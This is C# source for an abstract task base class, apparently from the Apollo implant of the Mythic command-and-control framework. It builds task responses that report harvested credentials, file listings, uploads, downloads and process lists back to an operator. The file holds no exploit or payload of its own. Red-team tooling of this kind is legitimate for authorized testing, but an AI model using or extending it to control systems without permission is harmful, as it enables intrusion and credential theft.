using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Enums.ApolloEnums;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using ApolloInterop.Serializers;
using ThreadingTask = System.Threading.Tasks.Task;

namespace ApolloInterop.Classes
{
    public abstract class Tasking : ITask
    {
        protected IAgent _agent;
        protected Task _data;
        protected static JsonSerializer _jsonSerializer = new JsonSerializer();
        protected CancellationTokenSource _cancellationToken;
        public System.Threading.Tasks.Task RunningTask { get; protected set; }
        public Tasking(IAgent agent, Task data)
        {
            _agent = agent;
            _data = data;
            _cancellationToken = new CancellationTokenSource();
        }

        public string ID()
        {
            return _data.ID;
        }

        public abstract System.Threading.Tasks.Task CreateTasking();

        public virtual void Kill()
        {
            _cancellationToken.Cancel();
            ThreadingTask.WaitAny(new ThreadingTask[] { RunningTask }, 60000);
        }

        public virtual TaskResponse CreateTaskResponse(object userOutput, bool completed, string status = "completed", IEnumerable<IMythicMessage> messages = null)
        {
            TaskResponse resp = new TaskResponse();
            resp.UserOutput = userOutput;
            resp.Completed = completed;
            resp.TaskID = _data.ID;
            resp.Status = status;
            if (messages != null)
            {
                List<EdgeNode> edges = new List<EdgeNode>();
                List<Credential> creds = new List<Credential>();
                List<RemovedFileInformation> removed = new List<RemovedFileInformation>();
                List<Artifact> artifacts = new List<Artifact>();
                List<ProcessInformation> processes = new List<ProcessInformation>();
                foreach (IMythicMessage msg in messages)
                {
                    switch (msg.GetTypeCode())
                    {
                        case MessageType.EdgeNode:
                            edges.Add((EdgeNode)msg);
                            break;
                        case MessageType.FileBrowser:
                            resp.FileBrowser = (FileBrowser)msg;
                            break;
                        case MessageType.Credential:
                            creds.Add((Credential)msg);
                            break;
                        case MessageType.RemovedFileInformation:
                            removed.Add((RemovedFileInformation)msg);
                            break;
                        case MessageType.Artifact:
                            artifacts.Add((Artifact)msg);
                            break;
                        case MessageType.UploadMessage:
                            resp.Upload = (UploadMessage)msg;
                            break;
                        case MessageType.DownloadMessage:
                            resp.Download = (DownloadMessage)msg;
                            break;
                        case MessageType.ProcessInformation:
                            processes.Add((ProcessInformation)msg);
                            break;
                        default:
                            throw new Exception($"Unhandled message type while generating response: {msg.GetTypeCode()}");
                    }
                }
                resp.Edges = edges.ToArray();
                resp.Credentials = creds.ToArray();
                resp.RemovedFiles = removed.ToArray();
                resp.Artifacts = artifacts.ToArray();
                resp.Processes = processes.ToArray();
            }
            return resp;
        }
    }
}
